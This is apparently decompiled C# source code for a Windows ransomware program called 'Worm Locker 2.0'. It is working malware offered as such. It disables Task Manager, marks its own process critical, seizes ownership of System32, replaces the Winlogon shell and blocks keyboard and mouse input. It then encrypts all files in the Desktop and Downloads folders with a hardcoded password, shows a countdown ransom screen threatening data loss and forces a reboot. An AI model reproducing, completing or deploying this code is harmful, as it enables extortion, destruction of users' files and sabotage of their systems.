using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WormLocker2._0;

public class WormLocker2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Label label1;

	private Label lbl1;

	private Label label2;

	private Label label4;

	private TextBox textBox1;

	private Button DECRYPT;

	private Label label5;

	private Timer tmr_del_desktop;

	private Timer tmr_start_enc;

	private Timer tmr_unhide;

	private Timer tmr_out;

	private Panel panel1;

	private Label label3;

	private Label label6;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public WormLocker2()
	{
		InitializeComponent();
		((Control)label1).set_Text(TimeSpan.FromMinutes(120.0).ToString());
	}

	private void WormLocker2_Load(object sender, EventArgs e)
	{
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		EnableProxy();
		int processInformation = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo("cmd.exe", "/k color 47 && takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant %username%:F && takeown /f C:\\Windows\\System32\\drivers && icacls C:\\Windows\\System32\\drivers /grant %username%:F && Exit");
		process.Start();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		((Form)this).set_Location(new Point(-1000, -1000));
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey2.SetValue("Shell", "empty", RegistryValueKind.String);
		File.WriteAllText(folderPath + "\\worm_tool.sys", "encrypted");
		File.WriteAllText(text + "\\worm_tool.sys", "encrypted");
		tmr_del_desktop.Start();
		tmr_start_enc.Start();
		tmr_out.Start();
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label1).set_Text((TimeSpan.FromMinutes(120.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_unhide.Start();
	}

	public static void EnableProxy()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", writable: true);
		registryKey.SetValue("ProxyServer", 1);
		registryKey.SetValue("ProxyEnable", 1);
	}

	public static void DisableProxy()
	{
		string keyName = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings";
		Registry.SetValue(keyName, "ProxyEnable", 0);
	}

	private void WormLocker2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void Start_Encrypt()
	{
		FreezeMouse();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "LUC QPV BTR";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		tmr_del_desktop.Start();
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private void tmr_unhide_Tick(object sender, EventArgs e)
	{
		tmr_unhide.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process.Start("C:\\Windows\\System32\\ransom_voice.vbs");
		((Form)this).CenterToScreen();
		Thawouse();
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void DECRYPT_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "LUC QPV BTR")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			File.Delete("C:\\Windows\\System32\\LogonUI.exe");
			File.Copy("C:\\Windows\\System32\\LogonUItrue.exe", "C:\\Windows\\System32\\LogonUI.exe");
			File.Delete("C:\\Windows\\System32\\LogonUItrue.exe");
			File.Delete("C:\\Windows\\System32\\LogonUIinf.exe");
			OFF_Encrypt();
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			Process.Start("C:\\Windows\\explorer.exe");
			Process[] array = null;
			array = Process.GetProcessesByName("WormLocker2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private static void OFF_Encrypt()
	{
		FreezeMouse();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "LUC QPV BTR";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
			Thawouse();
		}
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		Process.Start("shutdown", "/r /t 0");
		Process[] array = null;
		array = Process.GetProcessesByName("wscript");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process[] array3 = null;
		array3 = Process.GetProcessesByName("WormLocker2.0");
		Process[] array4 = array3;
		foreach (Process process2 in array4)
		{
			process2.Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f3: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_040a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0414: Expected O, but got Unknown
		//IL_04ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b5: Expected O, but got Unknown
		//IL_055f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0569: Expected O, but got Unknown
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0847: Expected O, but got Unknown
		//IL_08f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0901: Expected O, but got Unknown
		//IL_0a7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a89: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(WormLocker2));
		pictureBox1 = new PictureBox();
		label1 = new Label();
		lbl1 = new Label();
		label2 = new Label();
		label4 = new Label();
		textBox1 = new TextBox();
		DECRYPT = new Button();
		label5 = new Label();
		tmr_del_desktop = new Timer(components);
		tmr_start_enc = new Timer(components);
		tmr_unhide = new Timer(components);
		tmr_out = new Timer(components);
		panel1 = new Panel();
		label3 = new Label();
		label6 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackColor(Color.Black);
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(396, 62));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(164, 198));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.FromArgb(26, 26, 26));
		((Control)label1).set_Cursor(Cursors.get_No());
		((Control)label1).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.Transparent);
		((Control)label1).set_Location(new Point(247, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(145, 37));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("00:00:00");
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_BackColor(Color.Black);
		((Control)lbl1).set_Cursor(Cursors.get_No());
		((Control)lbl1).set_Font(new Font("Arial Black", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(15, 5));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(104, 15));
		((Control)lbl1).set_TabIndex(2);
		((Control)lbl1).set_Text("What happened?");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Black);
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(15, 21));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(270, 105));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Black);
		((Control)label4).set_Cursor(Cursors.get_No());
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(16, 143));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(260, 60));
		((Control)label4).set_TabIndex(5);
		((Control)label4).set_Text("If you do not pay by a certain time or turn off the\r\ncomputer, all your data will be permanently\r\ndeleted and your computer will not turn on \r\nproperly.");
		((Control)textBox1).set_BackColor(Color.FromArgb(26, 26, 26));
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(407, 266));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(141, 35));
		((Control)textBox1).set_TabIndex(6);
		((Control)textBox1).set_Text("000-000-000\r\n");
		((Control)DECRYPT).set_BackColor(Color.FromArgb(26, 26, 26));
		((Control)DECRYPT).set_Cursor(Cursors.get_Hand());
		((Control)DECRYPT).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)DECRYPT).set_ForeColor(Color.White);
		((Control)DECRYPT).set_Location(new Point(407, 310));
		((Control)DECRYPT).set_Name("DECRYPT");
		((Control)DECRYPT).set_Size(new Size(141, 34));
		((Control)DECRYPT).set_TabIndex(7);
		((Control)DECRYPT).set_Text("DECRYPT");
		((ButtonBase)DECRYPT).set_UseVisualStyleBackColor(false);
		((Control)DECRYPT).add_Click((EventHandler)DECRYPT_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.FromArgb(26, 26, 26));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(552, 364));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(89, 13));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("© Fish 6.19.2021\r\n");
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_unhide.set_Interval(10000);
		tmr_unhide.add_Tick((EventHandler)tmr_unhide_Tick);
		tmr_out.set_Enabled(true);
		tmr_out.set_Interval(7200000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		((Control)panel1).set_BackColor(Color.FromArgb(128, 128, 255));
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)lbl1);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).set_Location(new Point(12, 158));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(288, 209));
		((Control)panel1).set_TabIndex(9);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Black);
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Arial Black", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(16, 127));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(195, 15));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("What will happen if I don't pay?");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_BackColor(Color.FromArgb(26, 26, 26));
		((Control)label6).set_Cursor(Cursors.get_No());
		((Control)label6).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label6).set_ForeColor(Color.Maroon);
		((Control)label6).set_Location(new Point(12, 118));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(235, 37));
		((Control)label6).set_TabIndex(10);
		((Control)label6).set_Text("INFORMATION");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(26, 26, 26));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(639, 379));
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)DECRYPT);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("WormLocker2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Worm Locker 2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(WormLocker2_FormClosing));
		((Form)this).add_Load((EventHandler)WormLocker2_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
